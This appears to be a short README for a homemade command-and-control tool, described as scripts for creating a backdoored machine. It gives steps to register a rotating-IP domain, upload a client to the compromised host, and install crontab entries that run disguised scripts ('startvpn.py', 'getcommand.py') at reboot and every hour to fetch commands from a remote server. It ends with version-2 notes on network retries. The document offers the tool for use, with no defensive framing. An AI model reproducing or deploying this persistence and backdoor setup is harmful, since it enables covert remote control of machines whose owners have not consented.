simple c2 it is a set of scripts for creating backdoored machine

1. register a domain name ip rotation
2. upload client to backdoored machine
3. add the following command to `crontab -e`:

`@reboot /usr/bin/python3 /home/startvpn.py >> /var/log/startovp.log 2>&1`
`0 * * * * /usr/bin/python3 /home/getcommand.py >> /var/log/getcommand.log 2>&1`

4. upload server to your remote server with public ip
5. run server.py `python3 server.py`
6. ...
7. profit


whats new in version 2?

1. network retry until it works
2. split client into 2 files in order to run it separetely
